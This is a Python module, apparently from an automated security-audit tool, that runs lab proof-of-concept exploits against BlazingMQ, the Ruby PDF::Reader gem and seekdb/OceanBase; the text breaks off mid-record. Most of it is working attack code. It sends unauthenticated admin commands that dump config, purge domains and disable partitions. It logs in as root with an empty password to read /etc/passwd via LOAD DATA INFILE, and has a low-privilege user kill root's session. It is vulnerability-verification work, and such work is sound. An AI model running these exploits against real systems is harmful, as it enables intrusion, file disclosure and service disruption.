"""Library / native-protocol lab PoCs.

HTTP canonical probes miss C++ brokers and Ruby libraries. These runners
execute inside the isolated lab container (or on localhost against a lab
port) and only emit findings when an oracle matches — otherwise they record
an honest DISPROVE.

Oracles (must appear in lab stdout/response):
  - RCE: uid=  / gid=
  - Authz bypass: BMQ_ADMIN_OK / brokerResponse code 0 + admin help text
  - Marshal RCE: MARSHAL_RCE_OK (must NOT fire on a safe clone)
"""
from __future__ import annotations

import asyncio
import json
import os
import re
import socket
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

from backend.async_process import terminate_and_reap


def wrap_bmq_control_event(payload: dict) -> bytes:
    """bmqp::EventHeader + JSON control body + padding (open-source BMQ encoding)."""
    payload_str = json.dumps(payload, separators=(",", ":"))
    padding_len = 4 - len(payload_str) % 4
    padding = bytes([padding_len] * padding_len)
    event_type = 1  # CONTROL
    encoding_json = 0x01 << 5  # TypeSpecific.ENCODING_JSON
    size = (8 + len(payload_str) + padding_len).to_bytes(4, "big")
    desc = bytes([0x40 + event_type, 0x02, encoding_json, 0x00])
    return size + desc + payload_str.encode("ascii") + padding


def bmq_client_identity(client_type: str = "E_TCPCLIENT") -> dict:
    return {
        "clientIdentity": {
            "protocolVersion": 999999,
            "sdkVersion": 999999,
            "clientType": client_type,
            "processName": "lotus-lab",
            "pid": 0,
            "sessionId": 1,
            "hostName": "localhost",
            "features": "PROTOCOL_ENCODING:JSON",
            "clusterName": "",
            "clusterNodeId": -1,
            "sdkLanguage": "E_CPP",
            "userAgent": "lotus-lab",
            "guidInfo": {"clientId": "lotus-lab", "nanoSecondsFromEpoch": 0},
        }
    }


def _recv_bmq_event(sock: socket.socket) -> Tuple[bytes, bytes]:
    header = b""
    while len(header) < 8:
        part = sock.recv(8 - len(header))
        if not part:
            raise ConnectionError("broker closed during header")
        header += part
    size = int.from_bytes(header[:4], "big")
    remaining = size - 8
    body = b""
    while remaining > 0:
        part = sock.recv(remaining)
        if not part:
            raise ConnectionError("broker closed during body")
        body += part
        remaining -= len(part)
    if not body:
        return header, b""
    pad = body[-1]
    if 1 <= pad <= 4:
        body = body[:-pad]
    return header, body


def bmq_admin_command(host: str, port: int, command: str, timeout: float = 8.0) -> str:
    """Send one unauthenticated E_TCPADMIN command; return the response body text."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(wrap_bmq_control_event(bmq_client_identity("E_TCPADMIN")))
        _recv_bmq_event(sock)
        sock.sendall(wrap_bmq_control_event({"rId": 1, "adminCommand": {"command": command}}))
        _hdr, body = _recv_bmq_event(sock)
        return body.decode("utf-8", errors="replace")
    finally:
        try:
            sock.close()
        except Exception:
            pass


def bmq_unauth_admin(host: str, port: int, timeout: float = 8.0) -> Dict[str, Any]:
    """Unauthenticated E_TCPADMIN + `help`. Oracle: CMD subcommands in the body.

    Impact extras: BROKERCONFIG DUMP (config disclosure) and DOMAINS PURGE (accepted).
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(wrap_bmq_control_event(bmq_client_identity("E_TCPADMIN")))
        _hdr, nego = _recv_bmq_event(sock)
        nego_txt = nego.decode("utf-8", errors="replace")
        sock.sendall(wrap_bmq_control_event({"rId": 1, "adminCommand": {"command": "help"}}))
        _hdr2, admin = _recv_bmq_event(sock)
        admin_txt = admin.decode("utf-8", errors="replace")
        ok = (
            "CMD subcommands" in admin_txt
            or "adminCommandResponse" in admin_txt
            or '"code":0' in nego_txt.replace(" ", "")
        )
        dump = ""
        purge = ""
        disable = ""
        enable = ""
        if ok:
            try:
                dump = bmq_admin_command(host, port, "BROKERCONFIG DUMP", timeout)
                purge = bmq_admin_command(
                    host, port, "DOMAINS DOMAIN bmq.test.mem.priority PURGE", timeout,
                )
                disable = bmq_admin_command(
                    host, port,
                    "CLUSTERS CLUSTER local STORAGE PARTITION 0 DISABLE", timeout,
                )
                enable = bmq_admin_command(
                    host, port,
                    "CLUSTERS CLUSTER local STORAGE PARTITION 0 ENABLE", timeout,
                )
            except Exception:
                pass
        return {
            "ok": ok,
            "negotiate": nego_txt[:800],
            "admin": admin_txt[:1200],
            "dump": dump[:800],
            "purge": purge[:400],
            "disable": disable[:300],
            "enable": enable[:300],
            "config_dump_ok": bool(re.search(r"etcDir|brokerInstanceName", dump)),
            "purge_accepted": "adminCommandResponse" in purge,
            "partition_disabled": "SUCCESS" in disable,
            "partition_restored": "SUCCESS" in enable,
            "oracle": "CMD subcommands" if "CMD subcommands" in admin_txt else (
                "adminCommandResponse" if "adminCommandResponse" in admin_txt else "none"
            ),
        }
    finally:
        try:
            sock.close()
        except Exception:
            pass


PDF_MARSHAL_POC = r'''
require "pdf/reader"
path = "/app/spec/data/minimal.pdf"
path = "spec/data/minimal.pdf" unless File.file?(path)
begin
  PDF::Reader.new(path).pages[0].walk(Object.new)
  puts "MARSHAL_WALK_OK"
rescue Exception => e
  puts "MARSHAL_WALK_ERR:#{e.class}:#{e.message}"
end
'''

PDF_OPERATOR_ESCAPE_POC = r'''
require "pdf/reader"
require "tmpdir"
def make_pdf(stream)
  o1 = "1 0 obj<< /Type /Catalog /Pages 2 0 R >>endobj\n"
  o2 = "2 0 obj<< /Type /Pages /Kids [3 0 R] /Count 1 >>endobj\n"
  o3 = "3 0 obj<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R >>endobj\n"
  o4 = "4 0 obj<< /Length #{stream.bytesize} >>stream\n#{stream}endstream\nendobj\n"
  header = "%PDF-1.4\n"
  chunks = [header, o1, o2, o3, o4]
  offsets, pos = [], 0
  chunks.each { |c| offsets << pos; pos += c.bytesize }
  xref = "xref\n0 5\n0000000000 65535 f \n"
  (1..4).each { |i| xref << ("%010d 00000 n \n" % offsets[i]) }
  body = chunks.join
  body + "#{xref}trailer<< /Size 5 /Root 1 0 R >>\nstartxref\n#{body.bytesize}\n%%EOF\n"
end
path = File.join(Dir.tmpdir, "lotus_op.pdf")
File.binwrite(path, make_pdf("(id) system\n"))
class Rec
  def method_missing(*a); puts "MM:#{a.first}"; end
end
begin
  PDF::Reader.new(path).pages[0].walk(Rec.new)
  puts "OPERATOR_MAPPED=#{PDF::Reader::PagesStrategy::OPERATORS["system"].inspect}"
  puts "OPERATOR_ESCAPE_DONE"
rescue Exception => e
  puts "OPERATOR_ESCAPE_ERR:#{e.class}:#{e.message}"
end
'''


def pdf_reader_poc_scripts() -> List[Dict[str, Any]]:
    return [
        {
            "id": "pdf_marshal_clone_state",
            "title": "PDF::Reader Marshal.load during q/Q graphics-state clone",
            "cvss": 8.1,
            "class": "deserialization",
            "file": "lib/pdf/reader/page_state.rb",
            "argv": ["ruby", "-I", "/app/lib", "-I", "lib", "-e", PDF_MARSHAL_POC],
            "prove": lambda out: bool(re.search(r"uid=\d+|MARSHAL_RCE_OK", out or "")),
            "disprove_ok": lambda out: "MARSHAL_WALK_OK" in (out or "") or "MARSHAL_WALK_ERR" in (out or ""),
        },
        {
            "id": "pdf_operator_send_escape",
            "title": "PDF content-stream operator escapes into Kernel#system",
            "cvss": 9.8,
            "class": "code_injection",
            "file": "lib/pdf/reader/page.rb",
            "argv": ["ruby", "-I", "/app/lib", "-I", "lib", "-e", PDF_OPERATOR_ESCAPE_POC],
            "prove": lambda out: bool(re.search(r"uid=\d+", out or "")),
            "disprove_ok": lambda out: "OPERATOR_ESCAPE_DONE" in (out or "") or "OPERATOR_ESCAPE_ERR" in (out or ""),
        },
    ]


async def _docker_exec(container: str, argv: List[str], timeout: float = 30.0) -> Tuple[str, int]:
    try:
        from backend.lab import _controlled_child_env
        child_env = _controlled_child_env()
    except Exception:
        child_env = None
    proc = await asyncio.create_subprocess_exec(
        "docker", "exec", container, *argv,
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT,
        env=child_env,
    )
    try:
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.CancelledError:
        await terminate_and_reap(proc)
        raise
    except asyncio.TimeoutError:
        await terminate_and_reap(proc)
        return "TIMEOUT", -1
    return stdout.decode(errors="replace"), proc.returncode


async def _local_exec(argv: List[str], timeout: float = 30.0, cwd: Optional[str] = None) -> Tuple[str, int]:
    # Running repository gem/tool code on the API host defeats lab isolation.
    # Keep this emergency compatibility path opt-in and visible; normal audits
    # must use the hardened Docker lab or record an honest skip.
    if (os.environ.get("LOTUS_ALLOW_UNSAFE_HOST_TOOLCHAIN", "")
            .strip().lower() not in ("1", "true", "yes", "on")):
        return "host toolchain disabled; use isolated lab", 126
    try:
        from backend.lab import _controlled_child_env
        child_env = _controlled_child_env()
    except Exception:
        child_env = None
    proc = await asyncio.create_subprocess_exec(
        *argv,
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT,
        cwd=cwd,
        env=child_env,
    )
    try:
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.CancelledError:
        await terminate_and_reap(proc)
        raise
    except asyncio.TimeoutError:
        await terminate_and_reap(proc)
        return "TIMEOUT", -1
    return stdout.decode(errors="replace"), proc.returncode


async def ensure_ruby_gem_host(dest: Path, send=None, repo_id: int = 0) -> bool:
    """Emergency host fallback, disabled unless explicitly authorized."""
    dest = Path(dest)
    out, rc = await _local_exec(
        ["ruby", "-e", "require 'pdf/reader'; puts 'SMOKE_OK'"], timeout=15,
    )
    if "SMOKE_OK" in (out or ""):
        return True
    gemspecs = list(dest.glob("*.gemspec"))
    if gemspecs:
        build_out, _ = await _local_exec(
            ["sh", "-c", "gem build *.gemspec && gem install --user-install --no-document *.gem"],
            timeout=120, cwd=str(dest),
        )
        if send:
            await send(repo_id, f"host gem install: {(build_out or '')[-180:]}")
    out, rc = await _local_exec(
        ["ruby", "-e", "require 'pdf/reader'; puts 'SMOKE_OK'"], timeout=15,
    )
    return "SMOKE_OK" in (out or "")


def mysql_cli_query(host: str, port: int, sql: str, user: str = "root",
                    password: str = "", timeout: float = 12.0) -> Dict[str, Any]:
    """Empty-password MySQL/OceanBase login + query via mysql client or PyMySQL."""
    import shutil
    import subprocess
    bin_ = shutil.which("mysql") or shutil.which("mariadb")
    if bin_:
        env = dict(**{k: v for k, v in __import__("os").environ.items() if k != "MYSQL_PWD"})
        cmd = [bin_, "-h", host, "-P", str(port), f"-u{user}", f"--password={password}",
               "-N", "-e", sql, "--connect-timeout=8"]
        try:
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, env=env)
        except Exception as e:
            return {"ok": False, "error": str(e), "out": ""}
        out = (p.stdout or "") + (p.stderr or "")
        return {"ok": p.returncode == 0, "rc": p.returncode, "out": out[:2000]}
    try:
        import pymysql
        conn = pymysql.connect(
            host=host, port=int(port), user=user, password=password,
            connect_timeout=int(timeout), autocommit=True,
        )
        try:
            cur = conn.cursor()
            parts = []
            for stmt in [s.strip() for s in sql.split(";") if s.strip()]:
                cur.execute(stmt)
                try:
                    rows = cur.fetchall()
                    if rows:
                        parts.append("\n".join("\t".join("" if c is None else str(c) for c in r) for r in rows))
                except Exception:
                    parts.append("OK")
            return {"ok": True, "rc": 0, "out": "\n".join(parts)[:2000]}
        finally:
            conn.close()
    except Exception as e:
        return {"ok": False, "error": str(e), "out": ""}


def seekdb_empty_root_impact(host: str, port: int) -> Dict[str, Any]:
    """Prove default empty-root: identity + write + server file read. DISPROVE FILE bypass."""
    ident = mysql_cli_query(host, port, "SELECT USER(); SELECT CURRENT_USER();")
    if not ident.get("ok"):
        return {"ok": False, "stage": "login", **ident}
    write = mysql_cli_query(
        host, port,
        "CREATE DATABASE IF NOT EXISTS lotus_poc_impact; "
        "CREATE TABLE IF NOT EXISTS lotus_poc_impact.t(c text); "
        "SHOW DATABASES LIKE 'lotus_poc_impact';",
    )
    root_load = mysql_cli_query(
        host, port,
        "LOAD DATA INFILE '/etc/passwd' INTO TABLE lotus_poc_impact.t; "
        "SELECT c FROM lotus_poc_impact.t LIMIT 3;",
    )
    setup = mysql_cli_query(
        host, port,
        "CREATE USER IF NOT EXISTS 'lotus_low'@'%' IDENTIFIED BY 'lotuslow'; "
        "GRANT SELECT, INSERT ON lotus_poc_impact.* TO 'lotus_low'@'%';",
    )
    as_low = mysql_cli_query(
        host, port,
        "LOAD DATA INFILE '/etc/passwd' INTO TABLE lotus_poc_impact.t;",
        user="lotus_low", password="lotuslow",
    )
    err = (as_low.get("error") or "") + (as_low.get("out") or "")
    file_denied = (not as_low.get("ok")) and bool(re.search(
        r"1227|FILE privilege|Access denied", err, re.I,
    ))
    passwd_hit = bool(re.search(r"root:x:0:0:", (root_load.get("out") or "")))
    return {
        "ok": True,
        "identity": ident.get("out", "")[:400],
        "write": write.get("out", "")[:400],
        "write_ok": bool(write.get("ok")),
        "root_file_read": root_load.get("out", "")[:400],
        "root_file_read_ok": passwd_hit,
        "lowpriv_load_data": err[:400],
        "file_priv_bypass_disproven": file_denied,
        "setup_rc": setup.get("rc"),
    }


def seekdb_kill_any_session(host: str, port: int) -> Dict[str, Any]:
    """Limited user (SELECT+INSERT only) kills a root session.

    Kernel stub: ObKillSessionArg::check_auth_for_kill is `if (!(true))` deny.
    SHOW PROCESSLIST as lotus_low also lists other users' sessions.
    """
    import time
    try:
        import pymysql
    except ImportError:
        return {"ok": False, "error": "pymysql missing"}
    setup_err = ""
    try:
        admin = pymysql.connect(
            host=host, port=int(port), user="root", password="",
            connect_timeout=8, autocommit=True,
        )
        try:
            cur = admin.cursor()
            cur.execute("CREATE DATABASE IF NOT EXISTS lotus_poc_impact")
            cur.execute(
                "CREATE USER IF NOT EXISTS 'lotus_low'@'%' IDENTIFIED BY 'lotuslow'"
            )
            cur.execute(
                "GRANT SELECT, INSERT ON lotus_poc_impact.* TO 'lotus_low'@'%'"
            )
            cur.execute(
                "CREATE USER IF NOT EXISTS 'lotus_usage'@'%' IDENTIFIED BY 'u'"
            )
        finally:
            admin.close()
    except Exception as e:
        setup_err = str(e)[:240]
    try:
        root = pymysql.connect(
            host=host, port=int(port), user="root", password="",
            connect_timeout=8, autocommit=True,
        )
    except Exception as e:
        return {"ok": False, "stage": "root_connect", "error": str(e)[:240], "setup_err": setup_err}
    try:
        rcur = root.cursor()
        rcur.execute("SELECT CONNECTION_ID()")
        root_id = int(rcur.fetchone()[0])
        low = pymysql.connect(
            host=host, port=int(port), user="lotus_usage", password="u",
            connect_timeout=8, autocommit=True,
        )
        try:
            lcur = low.cursor()
            lcur.execute("SHOW PROCESSLIST")
            rows = lcur.fetchall() or []
            visible = any(
                int(r[0]) == root_id and str(r[1]).lower().startswith("root")
                for r in rows
            )
            kill_ok = False
            kill_err = ""
            try:
                lcur.execute(f"KILL {root_id}")
                kill_ok = True
            except Exception as e:
                kill_err = str(e)[:240]
            flush_ok = False
            try:
                lcur.execute("FLUSH PRIVILEGES")
                flush_ok = True
            except Exception:
                pass
        finally:
            low.close()
        time.sleep(0.25)
        ping_err = ""
        root_dead = False
        try:
            root.ping(reconnect=False)
        except Exception as e:
            root_dead = True
            ping_err = str(e)[:240]
        return {
            "ok": bool(kill_ok and root_dead),
            "root_id": root_id,
            "root_visible_to_lowpriv": visible,
            "kill_ok": kill_ok,
            "kill_error": kill_err,
            "root_dead": root_dead,
            "ping_error": ping_err,
            "flush_privileges_as_lowpriv": flush_ok,
            "setup_err": setup_err,
            "attacker": "lotus_usage",
        }
    finally:
        try:
            root.close()
        except Exception:
            pass


def seekdb_optimize_any_table(host: str, port: int) -> Dict[str, Any]:
    """USAGE-only user OPTIMIZE TABLE on oceanbase.__all_user (catalog ALTER).

    T_OPTIMIZE_TABLE is no_priv_needed; LMS sets skip_sys_table_check_=true.
    Oracle: progressive_merge_round and/or schema_version increment.
    """
    try:
        import pymysql
    except ImportError:
        return {"ok": False, "error": "pymysql missing"}
    setup_err = ""
    try:
        admin = pymysql.connect(
            host=host, port=int(port), user="root", password="",
            connect_timeout=8, autocommit=True,
        )
        try:
            cur = admin.cursor()
            cur.execute("CREATE USER IF NOT EXISTS 'lotus_usage'@'%' IDENTIFIED BY 'u'")
        finally:
            admin.close()
    except Exception as e:
        setup_err = str(e)[:240]
    try:
        root = pymysql.connect(
            host=host, port=int(port), user="root", password="",
            connect_timeout=8, autocommit=True,
        )
    except Exception as e:
        return {"ok": False, "stage": "root_connect", "error": str(e)[:240], "setup_err": setup_err}
    try:
        rcur = root.cursor()
        rcur.execute(
            "SELECT schema_version, progressive_merge_round FROM oceanbase.__all_table "
            "WHERE table_name='__all_user'"
        )
        before = rcur.fetchone()
        usage = pymysql.connect(
            host=host, port=int(port), user="lotus_usage", password="u",
            connect_timeout=8, autocommit=True,
        )
        try:
            ucur = usage.cursor()
            show_denied = False
            opt_ok = False
            opt_err = ""
            try:
                ucur.execute("SHOW TABLES FROM oceanbase")
            except Exception as e:
                show_denied = "1044" in str(e) or "Access denied" in str(e)
            try:
                ucur.execute("OPTIMIZE TABLE oceanbase.__all_user")
                opt_ok = True
                opt_err = ""
            except Exception as e:
                opt_ok = False
                opt_err = str(e)[:240]
        finally:
            usage.close()
        rcur.execute(
            "SELECT schema_version, progressive_merge_round FROM oceanbase.__all_table "
            "WHERE table_name='__all_user'"
        )
        after = rcur.fetchone()
        before_sv, before_round = (before or (None, None))
        after_sv, after_round = (after or (None, None))
        changed = (
            (before_round is not None and after_round is not None and after_round > before_round)
            or (before_sv is not None and after_sv is not None and after_sv != before_sv)
        )
        return {
            "ok": bool(opt_ok and changed),
            "show_tables_denied": show_denied,
            "optimize_ok": opt_ok,
            "optimize_error": opt_err,
            "before_schema_version": before_sv,
            "after_schema_version": after_sv,
            "before_merge_round": before_round,
            "after_merge_round": after_round,
            "setup_err": setup_err,
        }
    finally:
        try:
            root.close()
        except Exception:
            pass


def seekdb_disprove_stubs(host: str, port: int) -> Dict[str, Any]:
    """Statements that return OK without persisting privilege, plugins, locks, or C:H.

    Not findings. Recorded so Phase 2 does not re-promote statement-success oracles.
    """
    try:
        import pymysql
    except ImportError:
        return {"ok": False, "error": "pymysql missing"}
    try:
        usage = pymysql.connect(
            host=host, port=int(port), user="lotus_usage", password="u",
            connect_timeout=8, autocommit=True,
        )
        root = pymysql.connect(
            host=host, port=int(port), user="root", password="",
            connect_timeout=8, autocommit=True,
        )
    except Exception as e:
        return {"ok": False, "stage": "connect", "error": str(e)[:240]}
    items: List[Dict[str, Any]] = []

    def _try(cur, sql: str) -> Tuple[bool, str]:
        try:
            cur.execute(sql)
            try:
                cur.fetchall()
            except Exception:
                pass
            return True, ""
        except Exception as e:
            return False, str(e)[:200]

    try:
        ucur = usage.cursor()
        rcur = root.cursor()
        rcur.execute("SHOW GRANTS FOR 'lotus_usage'@'%'")
        grants_before = [r[0] for r in (rcur.fetchall() or [])]
        proxy_ok, proxy_err = _try(ucur, "GRANT PROXY ON 'root'@'%' TO 'lotus_usage'@'%'")
        rcur.execute("SHOW GRANTS FOR 'lotus_usage'@'%'")
        grants_after = [r[0] for r in (rcur.fetchall() or [])]
        items.append({
            "title": "GRANT PROXY returns OK but does not persist privileges",
            "sql": "GRANT PROXY ON 'root'@'%' TO 'lotus_usage'@'%'",
            "statement_ok": proxy_ok,
            "error": proxy_err,
            "grants_unchanged": grants_before == grants_after,
            "verdict": "DISPROVE",
        })
        plugin_ok, plugin_err = _try(ucur, "INSTALL PLUGIN r SONAME 'ha_example.so'")
        plugin_rows: List[Any] = []
        show_ok, show_err = _try(ucur, "SHOW PLUGINS")
        try:
            ucur.execute("SHOW PLUGINS")
            plugin_rows = list(ucur.fetchall() or [])
        except Exception:
            pass
        items.append({
            "title": "INSTALL PLUGIN returns OK but SHOW PLUGINS stays empty",
            "sql": "INSTALL PLUGIN r SONAME 'ha_example.so'",
            "statement_ok": plugin_ok,
            "error": plugin_err,
            "plugins": plugin_rows,
            "verdict": "DISPROVE",
        })
        lock_ok, lock_err = _try(ucur, "LOCK TABLES lotus_secret.creds WRITE")
        blocked = False
        elapsed = None
        try:
            import time as _time
            t0 = _time.time()
            rcur.execute("INSERT INTO lotus_secret.creds(pw) VALUES ('lock-probe')")
            elapsed = round(_time.time() - t0, 3)
            blocked = elapsed is not None and elapsed > 1.0
        except Exception as e:
            lock_err = (lock_err + " | root_insert=" + str(e)[:120]).strip(" |")
        _try(ucur, "UNLOCK TABLES")
        items.append({
            "title": "LOCK TABLES WRITE returns OK but does not block root DML",
            "sql": "LOCK TABLES lotus_secret.creds WRITE",
            "statement_ok": lock_ok,
            "error": lock_err,
            "root_insert_elapsed_s": elapsed,
            "blocked_root": blocked,
            "verdict": "DISPROVE",
        })
        prep_ok, prep_err = _try(ucur, "PREPARE s FROM 'SELECT pw FROM lotus_secret.creds'")
        exec_ok, exec_err = _try(ucur, "EXECUTE s")
        _try(ucur, "DEALLOCATE PREPARE s")
        items.append({
            "title": "PREPARE of unauthorized SELECT succeeds; EXECUTE is denied",
            "sql": "PREPARE/EXECUTE SELECT lotus_secret.creds",
            "prepare_ok": prep_ok,
            "execute_ok": exec_ok,
            "execute_error": exec_err,
            "verdict": "DISPROVE",
        })
        ana_ok, ana_err = _try(ucur, "ANALYZE TABLE lotus_secret.creds")
        read_ok, read_err = _try(ucur, "SELECT min_value FROM oceanbase.__all_column_stat LIMIT 1")
        colstat_unknown, _ = _try(ucur, "SELECT * FROM information_schema.COLUMN_STATISTICS")
        items.append({
            "title": "ANALYZE TABLE writes catalog stats the attacker cannot read",
            "sql": "ANALYZE TABLE lotus_secret.creds",
            "analyze_ok": ana_ok,
            "attacker_select_column_stat": read_ok,
            "select_error": read_err,
            "column_statistics_view": colstat_unknown,
            "verdict": "DISPROVE_C_H_below_threshold",
        })
        return {"ok": True, "items": items, "show_err": show_err, "prep_err": prep_err}
    finally:
        try:
            usage.close()
        except Exception:
            pass
        try:
            root.close()
        except Exception:
            pass


async def ensure_ruby_gem_lab(container: str, dest: Path, send=None, repo_id: int = 0) -> bool:
    """Install the local gem so `require 'pdf/reader'` works inside the pod."""
    gemspecs = list(Path(dest).glob("*.gemspec"))
    # The application image is read-only; put transient gem installs on the
    # lab's noexec tmpfs and keep GEM_HOME/GEM_PATH scoped to this probe.
    gem_env = ["env", "GEM_HOME=/tmp/lotus-gems", "GEM_PATH=/tmp/lotus-gems"]
    cmds = [
        [*gem_env, "gem", "install", "--no-document", "--install-dir", "/tmp/lotus-gems",
         "ttfunk", "Ascii85", "hashery", "afm", "ruby-rc4"],
    ]
    # gemspec may list missing rbi files; prefer RUBYLIB=/app/lib over gem build.
    cmds.append(["sh", "-c", "cd /app && (test -f rbi/pdf-reader.rbi && gem build *.gemspec --output /tmp/pdf-reader.gem && "
                 "GEM_HOME=/tmp/lotus-gems GEM_PATH=/tmp/lotus-gems gem install --no-document "
                 "--install-dir /tmp/lotus-gems /tmp/pdf-reader.gem || true)"])
    for argv in cmds:
        out, rc = await _docker_exec(container, argv, timeout=120)
        if send:
            await send(repo_id, f"lab gem prep rc={rc}: {(out or '')[-180:]}")
    smoke, rc = await _docker_exec(
        container, [*gem_env, "ruby", "-I", "/app/lib", "-e", "require 'pdf/reader'; puts 'SMOKE_OK'"], timeout=20,
    )
    return "SMOKE_OK" in (smoke or "")


async def run_library_lab_pocs(
    repo_id: int,
    dest: Path,
    *,
    container: Optional[str],
    language: str,
    leads: Optional[List[Dict[str, Any]]] = None,
    send=None,
    lab_host: Optional[str] = None,
    lab_port: Optional[int] = None,
    runtime_gaps: Optional[List[Dict[str, Any]]] = None,
) -> List[Dict[str, Any]]:
    """Run high-severity library/protocol PoCs. Proven OR explicitly disproven."""
    findings: List[Dict[str, Any]] = []
    disproven: List[Dict[str, Any]] = []
    runtime_gaps = runtime_gaps if runtime_gaps is not None else []
    dest = Path(dest)

    # --- BlazingMQ native protocol (works against lab port even without docker exec) ---
    ports = []
    if lab_port:
        ports.append(int(lab_port))
    trace_p = dest / ".lotus" / "phase1_trace.json"
    if trace_p.is_file():
        try:
            tr = json.loads(trace_p.read_text())
            ports.extend(int(x) for x in (tr.get("trace") or {}).get("ports") or [] if int(x) > 0)
        except Exception:
            pass
    host = lab_host or "127.0.0.1"
    if any("bmq" in str(dest).lower() or "blazing" in str(dest).lower() for _ in [0]) or (
        dest / "src" / "applications" / "bmqbrkr"
    ).exists():
        for port in dict.fromkeys(list(ports) + [30114, 40114]):
            try:
                res = await asyncio.to_thread(bmq_unauth_admin, host, port)
            except Exception as e:
                if send:
                    await send(repo_id, f"BMQ protocol PoC port {port} error: {e}")
                continue
            if res.get("ok"):
                findings.append({
                    "tool": "library-lab-poc",
                    "title": "Unauthenticated BlazingMQ admin session (E_TCPADMIN help)",
                    "cvss": 9.1,
                    "description": (
                        f"Connected to {host}:{port} with no credentials, negotiated "
                        f"clientType=E_TCPADMIN, ran adminCommand=help. Oracle={res.get('oracle')}. "
                        f"BROKERCONFIG DUMP={'PROVEN' if res.get('config_dump_ok') else 'not shown'}; "
                        f"DOMAINS PURGE accepted={res.get('purge_accepted')}. "
                        f"Default sample config has no authentication block; AnonAuthenticator "
                        f"implicitly authenticates clients that never send credentials. "
                        f"Negotiate: {res.get('negotiate','')[:180]}"
                    ),
                    "file": "src/groups/mqb/mqbauthz/mqbauthz_defaultauthorizer.cpp",
                    "line": 57,
                    "confidence": "high",
                    "qualification": "QUALIFIED",
                    "conviction_level": 3,
                    "proven_in_lab": True,
                    "poc_result": "triggered",
                    "poc": {"host": host, "port": port, "clientType": "E_TCPADMIN", "command": "help"},
                    "lab_evidence": [{
                        "path": f"tcp://{host}:{port}",
                        "command": "E_TCPADMIN + help / BROKERCONFIG DUMP / DOMAINS PURGE",
                        "snippet": (
                            (res.get("admin") or "")[:180] + " | dump="
                            + (res.get("dump") or "")[:120] + " | purge="
                            + (res.get("purge") or "")[:80]
                        ),
                        "anomaly_type": "auth_bypass",
                    }],
                    "canonical_class": "authz_bypass",
                    "measurements": {
                        "before": "unauthenticated TCP",
                        "after_help": res.get("oracle"),
                        "config_dump": bool(res.get("config_dump_ok")),
                        "purge_accepted": bool(res.get("purge_accepted")),
                        "partition_disabled": bool(res.get("partition_disabled")),
                        "partition_restored": bool(res.get("partition_restored")),
                    },
                })
                if send:
                    await send(repo_id, "PROVEN: unauthenticated BMQ admin command")
                break
            elif send:
                await send(repo_id, f"DISPROVE/unreachable BMQ admin on {host}:{port} oracle={res.get('oracle')}")

    # --- seekdb / OceanBase empty-root + FILE priv check ---
    seekdbish = (
        "seekdb" in str(dest).lower()
        or (dest / "src" / "observer").is_dir()
        or (dest / "src" / "sql" / "privilege_check").is_dir()
    )
    if seekdbish:
        s_ports = list(dict.fromkeys(
            (ports or []) + ([int(lab_port)] if lab_port else []) + [2881, 12881]
        ))
        for port in s_ports:
            try:
                res = await asyncio.to_thread(seekdb_empty_root_impact, host, port)
            except Exception as e:
                if send:
                    await send(repo_id, f"seekdb empty-root PoC port {port} error: {e}")
                continue
            if res.get("ok") and res.get("write_ok"):
                findings.append({
                    "tool": "library-lab-poc",
                    "title": "Default empty root password on published MySQL port (seekdb)",
                    "cvss": 9.8,
                    "description": (
                        f"Connected to {host}:{port} as root with an empty password and created "
                        f"database lotus_poc_impact. Identity={res.get('identity','')[:180]!r}. "
                        f"LOAD DATA INFILE /etc/passwd as empty-root: "
                        f"{'PROVEN ' + (res.get('root_file_read') or '')[:80] if res.get('root_file_read_ok') else 'not demonstrated'}. "
                        f"FILE-priv bypass as lotus_low(INSERT, no FILE): "
                        f"{'DISPROVEN' if res.get('file_priv_bypass_disproven') else 'inconclusive'} "
                        f"({(res.get('lowpriv_load_data') or '')[:120]})."
                    ),
                    "file": "README.md",
                    "line": 205,
                    "confidence": "high",
                    "qualification": "QUALIFIED",
                    "conviction_level": 3,
                    "proven_in_lab": True,
                    "poc_result": "triggered",
                    "poc": {"host": host, "port": port, "user": "root", "password": ""},
                    "lab_evidence": [{
                        "path": f"mysql://{host}:{port}",
                        "command": "mysql -uroot --password= empty + CREATE DATABASE lotus_poc_impact",
                        "snippet": (
                            (res.get("identity") or "")[:120] + " | "
                            + (res.get("root_file_read") or res.get("write") or "")[:180]
                        ),
                        "anomaly_type": "auth_bypass",
                    }],
                    "canonical_class": "authz_bypass",
                    "measurements": {
                        "before": "unauthenticated",
                        "after": "CREATE DATABASE succeeded",
                        "file_priv_bypass": not res.get("file_priv_bypass_disproven"),
                    },
                })
                if send:
                    await send(repo_id, "PROVEN: seekdb empty-root CREATE DATABASE")
                break
            elif send:
                await send(repo_id, f"seekdb empty-root on {host}:{port} not proven: {str(res)[:180]}")

        for port in s_ports:
            try:
                kres = await asyncio.to_thread(seekdb_kill_any_session, host, port)
            except Exception as e:
                if send:
                    await send(repo_id, f"seekdb KILL PoC port {port} error: {e}")
                continue
            if kres.get("ok"):
                findings.append({
                    "tool": "library-lab-poc",
                    "title": "USAGE-only SQL user can KILL any other session including root",
                    "cvss": 7.5,
                    "description": (
                        "ObKillSessionArg::check_auth_for_kill is stubbed (`if (!(true))` "
                        "deny branch never runs) and T_KILL is mapped to no_priv_needed. "
                        f"lotus_usage (USAGE only, no SELECT/PROCESS/SUPER) saw root session "
                        f"{kres.get('root_id')} in SHOW PROCESSLIST "
                        f"(visible={kres.get('root_visible_to_lowpriv')}) "
                        f"and KILL succeeded; victim ping={kres.get('ping_error')!r}. "
                        f"FLUSH PRIVILEGES also "
                        f"{'succeeded' if kres.get('flush_privileges_as_lowpriv') else 'failed'} "
                        "without RELOAD. Executor comments claim SUPER or same-user only."
                    ),
                    "file": "src/sql/engine/cmd/ob_kill_session_arg.cpp",
                    "line": 126,
                    "confidence": "high",
                    "qualification": "QUALIFIED",
                    "conviction_level": 3,
